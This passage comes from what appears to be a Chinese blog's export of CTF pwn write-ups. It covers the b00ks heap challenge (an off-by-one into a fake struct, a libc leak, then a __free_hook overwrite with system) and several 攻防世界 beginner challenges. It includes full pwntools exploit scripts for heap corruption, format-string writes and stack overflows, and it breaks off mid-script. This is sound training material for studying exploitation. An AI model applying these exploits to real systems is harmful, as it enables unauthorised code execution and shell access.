a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; <span class="comment">// 漏洞所在位置。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200117233015.png" alt></p><ul><li>注意到这个<code>off_202018</code>,很容易想到这是与<code>author_name</code>有关的。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200117233137.png" alt></p><ul><li><p>双击进去,它指向了<code>unk_202040</code>,由于我们的程序开启了<code>PIE保护</code>,所以真正存储<code>author_name</code>的位置应该是<code>程序真正的加载基址 + 0x202040</code>,这个程序真正的加载基址可以通过gdb调试得出。</p></li><li><p>继续看<code>create函数</code>，由于这个函数代码量有点大，不再把全部代码放出来。在该函数中,我们能根据下面这一块能得到book的结构体。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200117233915.png" alt></p><ul><li><p>其中<code>*((_DWORD *)book_struct + 6) = v1;</code>可以转化为<code>*((_QWORD *)book_struct + 3) = v1;</code></p></li><li><p>所以我们得到<code>book结构体</code></p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">stuct book&#123;</span><br><span class="line">  <span class="keyword">int</span> id;</span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">  <span class="keyword">char</span> *description;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注意到此处的<code>off_202010</code>,从上面红框中的代码也能看出来,<code>v2</code>是当前创建的book的索引,那么<code>off_202010</code>所对应的应该就是存放<code>book结构体</code>的<code>结构体数组</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200117234325.png" alt></p><ul><li><p>双击过去，它指向了<code>unk_202060</code>，在前面我们得知<code>unk_202040</code>存放的是<code>author_name</code>。</p></li><li><p>也就是说，<code>author_name</code>首地址与<code>book结构体数组首地址</code>相差<code>0x20</code>字节。而很巧，程序恰好限定了<code>author_name</code>的最大长度就是<code>0x20</code>，而且！！ 我们的<code>change_author_name函数</code>存在<code>off-by-one</code>漏洞，这也就意味着,我们能够通过这个漏洞对<code>book结构体数组的首地址</code>(也就是第一个book结构体的地址)进行一些操作或利用。</p></li></ul><h2 id="泄露第一个book结构体的地址"><a href="#泄露第一个book结构体的地址" class="headerlink" title="泄露第一个book结构体的地址"></a>泄露第一个book结构体的地址</h2><ul><li>能进行什么样的操作或者利用呢？ 接着看<code>case4: print()函数</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200117235346.png" alt></p><ul><li><p>这个函数能够打印出<code>author_name</code>，nice！。</p></li><li><p>我们设想一个程序执行流程，首先，我们应程序要求，输入了<code>author_name</code>，我们故意输入也就是<code>32个A</code>。在内存中应该是这样。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200118000223.png" alt></p><ul><li><p>注意蓝色部分，那里实际上就是<code>off-by-one漏洞</code>越界覆盖的低字节，覆盖成了<code>\x00</code>,实际上那里本来就是<code>\x00</code>…覆盖了以后还是<code>\x00</code>。</p></li><li><p>关于前面的地址，这是程序在我机器上面运行的<code>程序加载地址0x555555554000+0x202040(前面提到过)</code>得到的，不同机器有可能不一样。这个程序加载地址可以在<code>gdb</code>中使用<code>pie</code>或<code>vmmap</code>命令查得。</p></li><li><p>继续， 下面的<code>0x555555756060</code>就是<code>book结构体数组</code>的首地址，存放<code>第一个book结构体（后面记作book1）</code>的地址，当我们<code>create book1</code>时，<code>book1</code>的地址会覆盖掉这一块。而在C语言中，字符串是靠<code>\x00</code>来进行截断的，覆盖掉了<code>author_name</code>的<code>\x00</code>，那么我们就可以通过<code>print()函数</code>打印出<code>author_name</code>连带着把<code>book1的地址</code>打印出来了。</p></li></ul><h2 id="一些小补充"><a href="#一些小补充" class="headerlink" title="一些小补充"></a>一些小补充</h2><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200118003950.png" alt></p><ul><li>注意<code>create函数</code>里面，对于每个<code>book结构体</code>，它的chunk大小应该是0x20(用户申请) + 0x10(chunk头) = 0x30，但是由于前面还<code>malloc</code>了<code>book_name与book_description</code>，book1的地址和book2的地址相差可能并不是0x30，除非当<code>book_name和book_description</code>申请的内存足够大时它俩才相差0x30，不然就要另外计算咯，这好像和malloc的分配算法有关。 具体book1的地址和book2的地址差多少可以通过在本地动态调试算出来。这里也推荐通过动态调试来计算差值。</li></ul><h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><ul><li><p>如果知道了book1的地址和book2的地址之间的差值(这个差值无论是在本地打还是远程打应该都是不变的)，我们就可以通过刚刚通过打印得到的book1的地址来推算出book2的地址。</p></li><li><p>继续模拟一下流程，当我们创建了book1以后，内存应该是这个样子(具体值可能有所不同)。</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x555555756040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555756050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x0000555555758160</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">0x555555758150</span>:	<span class="number">0x0000000000000000</span>(prev_size)	<span class="number">0x0000000000000031</span>(size)</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000001</span>(ID)	<span class="number">0x0000555555758020</span>(book_name_ptr)</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x00005555557580c0</span>(book_des_ptr)	<span class="number">0x000000000000008c</span>(des_size)</span><br></pre></td></tr></table></figure><ul><li>非常巧的是，<code>book1的book_des_ptr</code>为<code>0x00005555557580c0</code>，如果我们申请<code>book_description</code>的大小足够大的话，它是有可能包含<code>0x0000555555758100</code>的。</li><li>为什么要包含这个地址？ 因为我们的程序是拥有<code>case5 ：change_author_name</code>的，可以多次使用<code>off-by-one</code>漏洞，当我们再次使用这个漏洞时，就会将<code>0x0000555555758160</code>的低字节覆盖为<code>\x00</code>，从而变成<code>0x0000555555758100</code>。</li></ul><h2 id="伪造book-struct"><a href="#伪造book-struct" class="headerlink" title="伪造book struct"></a>伪造book struct</h2><ul><li><p>在此之前，我们先创建一个<code>book2</code>,让它的book_name的size和book_description的size尽可能大！</p></li><li><p>这里尽量大也是为了后面泄露libc作铺垫。</p></li><li><p>这里都取0x21000（为啥取这个？懒了，wp上就是这个懒得换了。。），因为这俩size足够大，所以book2地址 = book1地址 + 0x30 。（这在前面小补充里面有讲，当然也可以动态调试出来）</p></li><li><p>优秀的大佬们由此想出来一个方法，就像<code>套娃</code>一样，在<code>book_description</code>中伪造一个<code>book结构体(记作book_struct)</code>。</p></li><li><p>由于<code>0x0000555555758100 - 0x00005555557580c0 = 0x40</code>,所以可以这么构造。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> <span class="comment">#Padding</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment">#ID</span></span><br><span class="line">payload += p64(book2_struct_addr + <span class="number">8</span>) <span class="comment">#book_name_ptr</span></span><br><span class="line">payload += p64(book2_struct_addr + <span class="number">8</span>) <span class="comment">#book_des_ptr</span></span><br><span class="line">payload += p64(<span class="number">0xffff</span>) <span class="comment">#description_size</span></span><br></pre></td></tr></table></figure><ul><li><p>填充0x40个a是为了让<code>0x0000555555758100</code>正好指向我们伪造的book_struct。</p></li><li><p><code>book2_struct_addr</code>是前面推算出来的book2的地址，+8以后就<code>指向(注意这是指向！)</code>了<code>book2_name_ptr</code>，至于为什么要让它<code>指向book2_name_ptr</code>，别着急，慢慢看下去。</p></li><li><p>程序是拥有<code>edit函数</code>的，可以修改<code>book_description</code>的，我们将其修改为我们的<code>payload</code>即可完成<code>伪造book_struct</code>。</p></li><li><p>我们伪造好以后， <code>change_author_name</code>,依然输入32个a，然后book结构体数组的首地址就变成了<code>0x0000555555758100</code>，也就指向了我们伪造的<code>book_struct</code>。这个<code>book_struct</code>是存在于<code>book1的description中</code>，而已经没有指针指向book1了，下面全靠这个伪造的book来发挥作用了。</p></li></ul><h2 id="泄露libc基地址"><a href="#泄露libc基地址" class="headerlink" title="泄露libc基地址"></a>泄露libc基地址</h2><blockquote><p>当分配的堆块的大小在某一个范围内的话，系统会通过brk方法来分配（brk 会直接拓展原来的堆），但是当分配超级大的堆块时，程序会用mmap方法来分配堆（mmap 会单独映射一块内存），mmap分配的堆块和libc之间存在着固定的偏移，因此我们可以推算出来libc的基地址（偏移需要用gdb中的vmmap来计算）</p></blockquote><ul><li><p>说白了就是可以在本地想办法算出来mmap和libc之间的偏移，这个偏移无论是打本地还是打远程都是固定的。</p></li><li><p>所以book2的name的size取得特别大，目的就是为了用来泄露libc。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200118014607.png" alt></p><ul><li><p>我们可以通过程序的<code>case4 ：print()</code>来打印出来<code>book2_name_ptr</code>。理解这里需要熟练理解与运用指针，因为我们<code>伪造的book_struct</code>的<code>book_name_ptr与book_des_ptr</code>都<code>指向book2_name_ptr</code>，而我们打印出来的都是<code>%s， 也就是字符串，也就是内容</code>，也就相当于我们把<code>book2_name_ptr</code>打印了出来。</p></li><li><p>emmmmm 取 Name 或者 Description其中一个的打印结果然后处理一下就行。。</p></li><li><p>然后我们在gdb中用vmmap命令可以得到本地调试时libc的基址</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200118015259.png" alt></p><ul><li>偏移就是本地调出来的<code>book2_name_ptr</code> - libc基址。</li><li>那么打远程的时候，libc基址就是<code>book2_name_ptr</code> - 偏移。</li></ul><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ul><li><p>由于这道题<code>Full RELRO</code>，我们无法通过覆盖<code>got表</code>来getshell。</p></li><li><p>优秀的大佬们想出了用<code>__free_hook</code>来劫持<code>free函数</code>。</p></li><li><p>关于<code>__free_hook</code>:</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="keyword">void</span> *__ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">void</span> *)</span> </span>= <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><ul><li><p>可以看出<code>__free_hook</code>是一个常量。 简单地说，当<code>__free_hook</code>的值不为NULL时，在调用<code>free函数</code>时，会首先执行<code>__free_hook</code>所指向的指令。</p></li><li><p>这里也提到了<code>free函数</code>，与其相关的肯定是程序中的<code>delete函数</code></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200118020633.png" alt></p><ul><li>这个函数会先free掉book_name,然后free掉book_des,最后是id，结合这个顺序，优秀的大佬们想出了构造方法。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libcbase</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libcbase</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next() + libcbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(target, <span class="number">1</span>, payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(system)</span><br><span class="line">edit_book(target, <span class="number">2</span>, payload2)</span><br><span class="line"></span><br><span class="line">delete_book(target, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure><ul><li>我们在执行完<code>edit_book(target, 1, payload1)</code>以后，由于<code>edit函数</code>修改的是<code>description的内容</code>，而我们此时修改的是伪造的<code>book_struct</code>,它的<code>description</code>的内容是<code>book2_struct_addr + 8</code>这是个指针，修改完后变成了指向<code>/bin/sh</code>的指针了。 由于p64占8字节，所以<code>p64(free_hook)</code>会覆盖到<code>book2_struct_addr + 16</code> 即 <code>book2的description位置</code>。</li></ul><ul><li>看着估计有点晕？仔细想想就是下面这种结构。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">伪造book:</span><br><span class="line">0x0000000000000001      , book2_struct_addr+8(指针)</span><br><span class="line">book2_struct_addr+8(指针), des_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">原来的book2:</span><br><span class="line">0x0000000000000002     ,book2_name_ptr</span><br><span class="line">book2_des_ptr          ,des_size</span><br><span class="line"></span><br><span class="line">第一次edit操作以后的book2:</span><br><span class="line">0x0000000000000002     ,bin_sh_ptr</span><br><span class="line">free_hook_ptr          ,des_size</span><br></pre></td></tr></table></figure><ul><li><p>在执行完<code>edit_book(target, 2, payload2)</code>以后，修改的实际上是<code>book2_struct_addr + 16</code>地址所指向的内容，也就是<code>free_hook_ptr</code>所指向的内容，即<code>free_hook的内容</code>，也就是说，执行完后，我们的<code>__free_hook</code>里面存着<code>system指令</code>。</p></li><li><p>那么按照前文所讲，我们在调用<code>free</code>之前，将会先调用<code>system函数</code>，那么如何给<code>system</code>传参？</p></li><li><p>由于我们的<code>delete函数</code>会先free掉<code>book_name_ptr</code>，但是<code>book2_name_ptr</code>已经被我们修改成<code>bin_sh_ptr</code>，而且调用free之前会先调用<code>system函数</code>，由于<code>void free(void *ptr)</code>，<code>int system(const char* command)</code>，这两个函数的参数都是个指针。那么 <code>free(book2_name_ptr)</code>就被我们成功变成了<code>system(bin_sh_ptr)</code>了！ Nice~</p></li></ul><h1 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04 exploit"></a>0x04 exploit</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200118023600.png" alt></p><ul><li>我是exp的搬运工:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level='debug', os='linux')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span><span class="params">(target, name_size, book_name, desc_size, book_desc)</span>:</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">'1'</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter book name size: '</span>, str(name_size))</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter book name (Max 32 chars): '</span>, book_name)</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter book description size: '</span>, str(desc_size))</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter book description: '</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_book</span><span class="params">(target, book_id)</span>:</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">'2'</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter the book id you want to delete: '</span>, str(book_id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span><span class="params">(target, book_id, book_desc)</span>:</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">'3'</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter the book id you want to edit: '</span>, str(book_id))</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter new book description: '</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_book</span><span class="params">(target)</span>:</span></span><br><span class="line">    target.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    target.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author_name</span><span class="params">(target, name)</span>:</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">'5'</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">'Enter author name: '</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_author_name</span><span class="params">(target, name)</span>:</span></span><br><span class="line">    target.sendlineafter(<span class="string">'Enter author name: '</span>, name)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    target = process(<span class="string">'./b00ks'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    target = remote(<span class="string">'127.0.0.1'</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>) <span class="comment"># 这个也可以是libc-2.23.so，都能打通。。</span></span><br><span class="line"><span class="comment"># used for debug</span></span><br><span class="line">image_base = <span class="number">0x555555554000</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    pwnlib.gdb.attach(target, <span class="string">'b *%d\nc\n'</span> % (image_base+<span class="number">0xd20</span>))</span><br><span class="line"></span><br><span class="line">input_author_name(target, <span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">create_book(target, <span class="number">140</span> ,<span class="string">'book_1'</span>, <span class="number">140</span>, <span class="string">'first book created'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak boo1_struct addr</span></span><br><span class="line">print_book(target)</span><br><span class="line">target.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">temp = target.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">book1_struct_addr = u64(temp[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">book2_struct_addr = book1_struct_addr + <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">create_book(target, <span class="number">0x21000</span>, <span class="string">'book_2'</span>, <span class="number">0x21000</span>, <span class="string">'second book create'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake book1_struct</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>) + p64(book2_struct_addr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(target, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change_author_name(target, <span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line"><span class="comment"># leak book2_name ptr</span></span><br><span class="line">print_book(target)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">temp = target.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">book2_name_ptr = u64(temp[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'book2_name_ptr = '</span> + hex(book2_name_ptr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># find in debug: mmap_addr - libcbase</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x7ffff7fba010</span> - <span class="number">0x7ffff7a0d000</span> <span class="comment">#这里的0x7ffff7fba010不同机器可能不一样，要动态调试一下。</span></span><br><span class="line">libcbase = book2_name_ptr - offset</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libcbase</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libcbase</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next() + libcbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(target, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit_book(target, <span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">delete_book(target, <span class="number">2</span>)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><ul><li>感谢各位大佬的WP！</li></ul><p><a href="https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/" target="_blank" rel="noopener">这篇博客评论区有黄金</a></p><p><a href="https://bbs.pediy.com/thread-246507.htm" target="_blank" rel="noopener">看雪的一篇新手向的WP</a></p><p><a href="https://blog.csdn.net/qq_40934487/article/details/91465347" target="_blank" rel="noopener">CSDN上一篇对萌新较为友好的WP</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#create" target="_blank" rel="noopener">CTF-WIKI</a></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-Pwn</title>
    <url>/2019/08/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Pwn/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/24090.jpg" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33894740&auto=1&height=66"></iframe>- exp中所涉及的所有端口都要以题目中给的端口为准,攻防世界这个平台同一道题目。。不同时间来做的话,端口不一样。。。<h1 id="0x01-get-shell"><a href="#0x01-get-shell" class="headerlink" title="0x01 get_shell"></a>0x01 get_shell</h1><ul><li>纯新手题。</li><li>Linux系统 nc连接到题中给的地址,然后<code>cat flag</code>即可。</li></ul><h1 id="0x02-CGfsb"><a href="#0x02-CGfsb" class="headerlink" title="0x02 CGfsb"></a>0x02 CGfsb</h1><ul><li><p>考察格式化字符串漏洞。</p></li><li><p>emmm Freebuf上有很详细的格式化字符串漏洞原理及利用的讲解,链接如下。</p></li></ul><p><a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" title="Freebuf" target="_blank" rel="noopener">传送门</a></p><p><a href="https://www.anquanke.com/post/id/85785" title="安全客" target="_blank" rel="noopener">传送门</a></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809154336.png" alt></p><ul><li>这个具体偏移可以手动测出来。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809160040.png" alt></p><ul><li>测出来为10,所以exp中就用<code>%10$n</code>了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809160209.png" alt></p><ul><li><p>pwnme的地址在IDA中就能找出来,是<code>0x0804A068</code></p></li><li><p>所以exp为:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">"111.198.29.45"</span>,<span class="number">37724</span>)</span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'please tell me your name:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">"aaaa"</span>)<span class="comment">#这个随便输,但是输入需要小于等于10个字节。</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'leave your message please:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(p32(pwnme)+<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'%10$n'</span>)</span><br><span class="line"><span class="comment">#因为p32(pwnme)占4个字节, 而需要在%10$n前面输入8个字节,所以还需要补4个字节,所以加了4个a</span></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul><li>后来在看一篇文章的时候发现了一个点。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813211419.png" alt></p><ul><li>改进后的exp如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">33602</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'please tell me your name:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'a'</span>*<span class="number">8</span> +<span class="string">'%14$naaa'</span> +p32(pwnme))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-when-did-you-born"><a href="#0x03-when-did-you-born" class="headerlink" title="0x03 when_did_you_born"></a>0x03 when_did_you_born</h1><ul><li>考察栈溢出、变量覆盖。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809151750.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809151925.png" alt></p><ul><li><p>var_20 就是v4, var_18就是v5,他俩之间隔了8个字节。</p></li><li><p>根据逻辑,第一次我们输入一个不是1926的数字,然后通过危险函数<code>gets</code> 将读入的数据存入v4, 通过溢出来覆盖v5,让v5的值为1926从而<code>cat flag</code></p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">41955</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Birth?'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">"9999"</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Name?'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">"a"</span>*<span class="number">8</span> + p32(<span class="number">1926</span>))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-hello-pwn"><a href="#0x04-hello-pwn" class="headerlink" title="0x04 hello_pwn"></a>0x04 hello_pwn</h1><ul><li>考察的和上一个题几乎一样。。。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153204.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153214.png" alt></p><ul><li><p>还是直接覆盖..</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">30278</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> +p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'lets get helloworld for bof'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x05-level0"><a href="#0x05-level0" class="headerlink" title="0x05 level0"></a>0x05 level0</h1><ul><li>考察栈溢出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153614.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153621.png" alt></p><ul><li>很明显的栈溢出</li><li>存在<code>/bin/sh</code>而且有被<code>system函数</code>调用</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153637.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153647.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153703.png" alt></p><ul><li>所以 exp如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = 